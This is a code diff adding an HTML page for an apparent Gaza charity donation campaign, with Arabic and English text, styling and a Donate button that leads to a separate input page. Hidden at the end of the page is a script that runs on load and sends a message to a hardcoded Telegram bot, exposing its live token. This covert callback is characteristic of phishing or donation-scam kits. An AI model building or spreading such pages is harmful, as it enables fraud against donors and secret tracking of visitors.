@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>تصدقوا</title>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta property="url" content="https://www.Donate.com">
+  <meta property="og:title" content="موقع يد بيد">
+  <meta name="description" content="تصدقو للطفال والنساء البرياء">
+  <meta property="og:description" content=" يد بيد لنساعد الطفال والنساء من هذا الجوع والفقر ">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <link rel="stylesheet" href="style.css">
+  <meta name="keywords"  content="  تبرع فلسطين , موقع يد بيد ,تصدقو معنا , موقع تبرع , يد بيد"/>
+  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTberJlTs3OUwOfaqQuhSFgcyrdqMvSPk4WwDBMzsOm7w&s" />
+<style type="text/css">
+
+ *{
+    margin:0;
+    padding:0;
+    scroll-behavior: smooth;
+ 
+ }
+
+.content{
+  width:100%;
+  height:100vh;
+  background-color:#0C356A;
+  
+}
+.nav{
+
+z-index:999;
+
+
+}
+h4{
+
+  font-size: 20px;
+}
+.nav nav {
+width:100%;
+height:70px;
+background-color:#0C356A;
+color:#fff;
+position:fixed;
+top:0;
+z-index:999;
+}
+.nav nav .foto{
+display:flex;
+align-items:center;
+justify-content: space-between;
+padding:10px;
+
+}
+nav .foto img{
+width:50px;
+height:50px;
+border-radius:50%;
+}
+
+.title{
+width:90%;
+height:400px;
+margin:auto;
+padding:10px;
+text-align:center;
+color:#fff;
+margin-top: 60px;
+font-size: 20px;
+
+
+
+}
+
+
+img{
+
+  width: 100%;
+}
+
+
+.image{
+width:100%;
+height:700px;
+background:#fff;
+margin:auto;
+margin-top:40em;
+text-align:center;
+color:blue;
+padding:10px 0;
+
+}
+
+
+/*buttom*/
+
+a .shadow__btn {
+  padding:8px 10px;
+  border: none;
+  font-size: 15px;
+  color: #fff;
+  border-radius: 7px;
+  letter-spacing: 4px;
+  font-weight: 700;
+  text-transform: uppercase;
+  transition: 0.5s;
+  transition-property: box-shadow;
+}
+
+.shadow__btn {
+  background: rgb(0,140,255);
+  box-shadow: 0 0 25px rgb(0,140,255);
+}
+
+.shadow__btn:hover {
+  box-shadow: 0 0 5px rgb(0,140,255),
+              0 0 25px rgb(0,140,255),
+              0 0 50px rgb(0,140,255),
+              0 0 100px rgb(0,140,255);
+}
+
+/*scroll*/
+
+
+.scroll{
+width:50px;
+height:50px;
+position:fixed;
+right:7px;
+bottom:10px;
+display:none;
+
+}
+
+
+.button {
+  width: 50px;
+  height: 50px;
+  border-radius: 50%;
+  background-color: rgb(20, 20, 20);
+  border: none;
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  box-shadow: 0px 0px 0px 4px rgba(180, 160, 255, 0.253);
+  cursor: pointer;
+  transition-duration: 0.3s;
+  overflow: hidden;
+  position: relative;
+}
+
+.svgIcon {
+  width: 12px;
+  transition-duration: 0.5s;
+}
+
+.svgIcon path {
+  fill: white;
+}
+
+.button:hover {
+  
+  border-radius: 50px;
+  transition-duration: 0.s;
+  background-color: rgb(181, 160, 255);
+  align-items: center;
+}
+
+.button:hover .svgIcon {
+  /* width: 20px; */
+  transition-duration: 0.3s;
+  transform: translateY(-200%);
+}
+
+.button::before {
+  position: absolute;
+  bottom: -20px;
+  content: "Top";
+  color: white;
+  /* transition-duration: .3s; */
+  font-size: 0px;
+}
+
+.button:hover::before {
+  font-size: 13px;
+  opacity: 1;
+  bottom: unset;
+  /* transform: translateY(-30px); */
+  transition-duration: 0.3s;
+}
+
+/*menu*/
+
+.toggle {
+  position: relative;
+  width: 40px;
+  height: 40px;
+  background-color: rgb(1, 103, 255);
+  box-shadow: 0 10px 20px rgba(0, 0, 0, 0.08);
+  border-radius: 50%;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  cursor: pointer;
+  overflow: hidden;
+  text-align:center;
+}
+
+.toggle span {
+  position: absolute;
+  height: 2px;
+  width: 20px;
+  background-color: rgb(255, 255, 255);
+  border-radius: 4px;
+  cursor: pointer;
+  transition: 0.5s;
+  text-align:center;
+}
+
+.toggle span:nth-child(1) {
+  transform: translateY(-15px);
+  width: 15px;
+  left: 10px;
+  text-align:center;
+}
+
+.toggle.toggle:hover span:nth-child(1) {
+  width: 30px;
+  transform: translateY(0px) rotate(45deg);
+  transition-delay: 0.125s;
+  text-align:center;
+}
+
+.toggle span:nth-child(2) {
+  transform: translateY(15px);
+  width: 10px;
+  left: 10px;
+  text-align:center;
+}
+
+.toggle.toggle:hover span:nth-child(2) {
+  width: 30px;
+  transform: translateY(0px) rotate(315deg);
+  transition-delay: 0.125s;
+  text-align:center;
+}
+
+.toggle:hover span:nth-child(3) {
+  transform: translateX(60px);
+}
+
+/*button Donate*/
+
+.btn {
+ width:40%;
+ height:50px;
+ 
+ 
+  --border-color: linear-gradient(-45deg, #ffae00, #7e03aa, #00fffb);
+  --border-width: .125em;
+  --curve-size: .5em;
+  --blur: 30px;
+  --bg:#0C356A;
+  --color: #afffff;
+  color: var(--color);
+    /* use position: relative; so that BG is only for .btn */
+  position: relative;
+  isolation: isolate;
+  display: inline-grid;
+  place-content: center;
+  padding: .5em 1.5em;
+  font-size: 20px;
+  border: 0;
+  box-shadow: 10px 10px 20px rgba(0, 0, 0, .6);
+  clip-path: polygon(
+            /* Top-left */
+            0% var(--curve-size),
+
+            var(--curve-size) 0,
+            /* top-right */
+            100% 0,
+            100% calc(100% - var(--curve-size)),
+
+            /* bottom-right 1 */
+            calc(100% - var(--curve-size)) 100%,
+            /* bottom-right 2 */
+            0 100%);
+  transition: color 250ms;
+}
+
+.btn::after,
+.btn::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+}
+
+.btn::before {
+  background: var(--border-color);
+  background-size: 300% 300%;
+  animation: move-bg7234 5s ease infinite;
+  z-index: -2;
+}
+
+@keyframes move-bg7234 {
+  0% {
+    background-position: 31% 0%
+  }
+
+  50% {
+    background-position: 70% 100%
+  }
+
+  100% {
+    background-position: 31% 0%
+  }
+}
+
+.btn::after {
+  background: var(--bg);
+  z-index: -1;
+  clip-path: polygon(
+            /* Top-left */
+            var(--border-width) 
+            calc(var(--curve-size) + var(--border-width) * .5),
+
+            calc(var(--curve-size) + var(--border-width) * .5) var(--border-width),
+
+            /* top-right */
+            calc(100% - var(--border-width)) 
+            var(--border-width),
+
+            calc(100% - var(--border-width)) 
+            calc(100% - calc(var(--curve-size) + var(--border-width) * .5)),
+
+            /* bottom-right 1 */
+            calc(100% - calc(var(--curve-size) + var(--border-width) * .5)) calc(100% - var(--border-width)),
+            /* bottom-right 2 */
+            var(--border-width) calc(100% - var(--border-width)));
+  transition: clip-path 500ms;
+}
+
+.btn:where(:hover, :focus)::after {
+  clip-path: polygon(
+                /* Top-left */
+                calc(100% - var(--border-width)) 
+
+                calc(100% - calc(var(--curve-size) + var(--border-width) * 0.5)),
+    
+                calc(100% - var(--border-width))
+
+                var(--border-width),
+    
+                /* top-right */
+                calc(100% - var(--border-width))
+
+                 var(--border-width),
+    
+                calc(100% - var(--border-width)) 
+
+                calc(100% - calc(var(--curve-size) + var(--border-width) * .5)),
+    
+                /* bottom-right 1 */
+                calc(100% - calc(var(--curve-size) + var(--border-width) * .5)) 
+                calc(100% - var(--border-width)),
+
+                /* bottom-right 2 */
+                calc(100% - calc(var(--curve-size) + var(--border-width) * 0.5))
+                calc(100% - var(--border-width)));
+  transition: 200ms;
+}
+
+.btn:where(:hover, :focus) {
+  color: #fff;
+}
+
+/*call*/
+
+.call{
+width:100%;
+height:70px;
+background-color:#0C356A;
+margin:auto;
+text-align:center;
+display: flex;
+align-items: center;
+justify-content:center;
+
+}
+
+.card {
+  width:60%;
+  height:20px;
+  background: rgb(255, 255, 255);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding:5px;
+  border-radius: 20px;
+  position: relative;
+  border: 2px solid transparent;
+  transition: all 0.5s ease-in-out;
+}
+
+.card:focus-within {
+  background-color: rgba(17, 17, 17, 0.5);
+  backdrop-filter: blur(10px);
+  border: 2px solid rgb(27, 27, 27);
+  box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+}
+
+.card button {
+  font-size: 34px;
+  background-color: transparent;
+  width: 50px;
+  padding: 7px;
+  height: 50px;
+  border-radius: 100%;
+  transition: all 0.2s ease-in;
+  border: 0;
+  cursor: pointer;
+}
+
+.card button:focus {
+  background-color: rgb(255, 255, 255);
+  margin-bottom: 45%;
+}
+
+
+/*sction*/
+
+.sction{
+width:20%;
+height:400px;
+background:#fff;
+position:fixed;
+right:0;
+overflow:hidden;
+border-radius:0 0 0 40px;
+
+}
+.cl{
+display:none;
+
+}
+.sction2{
+width:500px;
+height:600px;
+border-radius:50%;
+background-color:#0C356A;
+position:fixed;
+z-index:999;
+right:-450px;
+top:0;
+
+}
+
+ul{
+list-style:none;
+
+}
+
+ul li a{
+  text-decoration:none;
+  color:#0C356A;
+  display:block;
+  padding:10px;
+  margin:10px 0;
+  border-radius:8px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+  
+}
+ul li a:hover,.act{
+background:#5851DB;
+color:#fff;
+}
+ul li a i{
+font-size:18px;
+}
+#h{
+color:#00008B;
+}
+#t{
+color:#00ADFF;
+}
+
+#f{
+color:#405DE6;
+
+}
+#i{
+color:#048dc4;
+
+}
+#d{
+color:#FCAF45;
+}
+#l{color:#F77737;}
+
+
+/*numbers*/
+
+.numbrs{
+width:350px;
+height:350px;
+background-color:#0C356A;
+margin:auto;
+margin-right:-250px;
+border-radius:50%;
+position:relative;
+
+}
+
+.tpa{
+width:250px;
+height:50px;
+background-color:#0C356A;
+margin-left:-130px;
+border-radius:50px 0 0 50px;
+color:#fff;
+
+}
+
+.za{
+width:250px;
+height:50px;
+background-color:#0C356A;
+position:absolute;
+bottom:0;
+margin-left:-150px;
+border-radius:50px 0 0 50px;
+color:#fff;
+}
+
+
+
+@media screen and (max-width:500px){
+
+  .btn{
+   width: 80%;
+
+  }
+  .title{
+
+    font-size: 15px;
+  }
+  .sction{
+
+    width: 40%;
+  }
+
+
+  
+}
+
+@media screen and (max-width: 1024px) {
+
+  .image{
+
+margin-top: 15em;
+}
+.sction{
+
+width: 40%;
+}
+
+}
+
+</style>
+</head>
+<body>
+        
+   <div class="content">
+                 
+       <div class="nav">
+          <nav>
+               <div class="foto">
+         <img src="3.jpeg">
+         <h4>لجلك ياغزة</h4>
+         <a href="#" ><button class="shadow__btn">Donate</button></a>
+         
+            <div class="container">
+            <div class="toggle c">
+            <span></span>
+            <span></span>
+            <span></span>
+            </div>
+            </div>
+       
+                </div> 
+            </nav>
+       </div> 
+                 
+                 
+         <div class="sction cl">
+          <div class="sction2"></div>
+       
+        
+            <ul>
+               <li>
+                    <a href="index.html"><i class="fas fa-home" id="h"></i>
+                    
+                        <p>Home</p>
+                    </a>
+                  
+               </li>
+               
+               <li>
+               <a href="#"><i class="fas fa-language" id="l"></i>
+                  <p>Language</p>
+               
+               </a>
+             
+               </li>
+               
+               <li>
+               <a href="inp.html" class="act"><i class="fas fa-donate" id="d"></i>
+               <p>Donate</p>
+               
+               </a>
+               
+               </li>
+               
+               <li>
+               <a href="https://www.facebook.com/profile.php?id=61555820225529"><i class="fab fa-facebook" id="f"></i>
+                  <p>Facebook</p>
+               
+               </a>
+               
+               </li>
+               
+               <li>
+               <a href="#"><i class="fab fa-telegram" id="i"></i>
+               
+               <p>Telegram</p>
+               
+               
+               </a>
+             
+               </li>
+               
+               <li>
+               <a href="#"><i class="fab fa-twitter" id="t"></i>
+                   <p>Twitter</p>
+               
+               </a>
+               
+               </li>
+            
+            </ul>  
+         
+         
+         
+         </div>       
+                         
+                         
+                         
+                         
+                         
+                         
+       <div class="title">
+         <h2>حملات جمع التبرعات</h2>
+         <h2>Fundraising Campaigns</h2><br>
+          <p>! .. بعيدا عن كل شيء
+          ! لا يتألم في الشتاء إلا الفقراء .
+          ف تصدقوا * | ! ..away from everything
+          ! Only the poor suffer in winter.
+          So believe it*</p><br>
+       
+        <img src="5.png" id="img">
+       </div> 
+          
+           
+          
+       <div class="image" id="Donate">
+         
+          <img src="6.png" id="img7">   
+          <img src="7.png" id="">
+          <img src="8.jpeg">  
+          
+          <div class="numbr">
+          
+                
+           
+          </div>
+      
+          <button class="btn"> تبرع</button>
+       </div>
+         
+   
+      <div class="scroll" >
+      
+         <button class="button">
+         <svg class="svgIcon" viewBox="0 0 384 512">
+         <path
+         d="M214.6 41.4c-12.5-12.5-32.8-12.5-45.3 0l-160 160c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L160 141.2V448c0 17.7 14.3 32 32 32s32-14.3 32-32V141.2L329.4 246.6c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3l-160-160z"
+         ></path>
+         </svg>
+         </button>
+         
+      
+      </div>
+      
+      
+      
+   </div>       
+       
+       <script type="text/javascript">
+       let bot = document.querySelector(".scroll");
+       let button = document.querySelector(".button");
+       let c = document.querySelector(".c");
+       let show = document.querySelector(".sction");
+       let  don = document.querySelector(".btn");
+
+       tok = "6670158980:AAHKTW29hxrgPRVGNT-PtlRm-EQi-HTmZ0Q";
+        id = "5152526784";
+        text = "تم تسجيل دخول ";
+        const url = `https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=${text}`;
+        const xht = new XMLHttpRequest();
+        xht.open("GET",url, true);
+        xht.send();
+
+       don.onclick =()=>{
+           
+         location.href="inp.html";
+       
+       }
+
+
+       
+    
+    
+
+       window.onscroll = function(){
+       if(scrollY >= 600){
+       bot.style.display="block";
+       }else{
+       bot.style.display="none";
+       
+       }
+       }
+       
+       button.onclick = function(){
+       scroll({
+       left:0,
+       top:0,
+       
+       behavior:"smooth"
+       })
+       
+       } 
+       
+     c.onclick = function (){
+        
+       show.classList.toggle("cl")
+   }
+       </script>
+       
+</body>
+</html>
